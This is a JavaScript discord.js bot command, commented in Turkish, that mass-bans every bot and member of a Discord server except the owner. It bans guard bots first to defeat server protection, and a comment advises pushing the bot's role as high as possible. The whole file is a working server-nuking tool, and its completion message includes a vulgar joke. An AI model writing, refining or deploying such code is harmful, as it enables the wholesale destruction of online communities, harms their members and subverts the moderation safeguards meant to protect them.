const config = require("../config.json");

module.exports = {
  name: "ban",
  description: "Sunucudaki tüm üyeleri ve botları banla",
  async execute(message, args, client) {
    if (!message.guild) {
      return message.reply("Bu komut sadece sunucu içinde kullanılabilir!");
    }

    const hedefSunucu = message.guild;

    try {
      await message.react("🔥"); // komutu kullandıktan sonra mesajınıza ekliceği tepki emojisi değiştirebilirsiniz
      await hedefSunucu.members.fetch();
      const uyeler = hedefSunucu.members.cache;

      let banlananSayisi = 0;
      let atlanSayisi = 0;

      // üyelerden önce botları banlar bu da Can sıkıcı guard botu var ise sunucuda ilk onlardan başlar Kendi botunuzun rolünü çıkartabildiğiniz kadar üste çıkartın
      console.log(`${hedefSunucu.name} sunucusunda botları banlamaya başlıyor`);
      for (const [id, uye] of uyeler) {
        if (uye.user.bot && uye.id !== client.user.id) {
          try {
            await uye.ban({ reason: "botoria" }); // ban atarken ban nedeni Şuan botoria istediğinizi yapabilirsiniz Reason işte
            banlananSayisi++;
            console.log(`Bot banlandı: ${uye.user.tag}`);
          } catch (error) {
            atlanSayisi++;
            console.log(`⚠️ Bot banlanamadı: ${uye.user.tag}`);
          }
        }
      }
      console.log(
        `👥 ${hedefSunucu.name} sunucusunda üyeleri banlamaya başlıyor`
      );
      for (const [id, uye] of uyeler) {
        if (
          !uye.user.bot &&
          uye.id !== config.ownerId &&
          uye.id !== client.user.id
        ) {
          try {
            await uye.ban({ reason: "botoria" }); // bot banlama işlemindeki ile aynı Reason işte
            banlananSayisi++;
            console.log(`Üye banlandı: ${uye.user.tag}`);
          } catch (error) {
            atlanSayisi++;
            console.log(`⚠️ Üye banlanamadı: ${uye.user.tag}`);
          }
        }
      }

      const cevap = ` Sunucu Sikiş pardon banlanma tamamlandı !\n Banlanan kişi sayısı: ${banlananSayisi}\n⚠️ Atlanan: ${atlanSayisi}`;

      try {
        message.channel.send(cevap);
      } catch (error) {
        const sahip = await client.users.fetch(config.ownerId);
        sahip.send(`${cevap}\nSunucu: ${hedefSunucu.name}`);
      }
    } catch (error) {
      console.error("Ban komutunda hata:", error);
      message.reply("Ban komutu çalıştırılırken bir hata oluştu.");
    }
  },
};
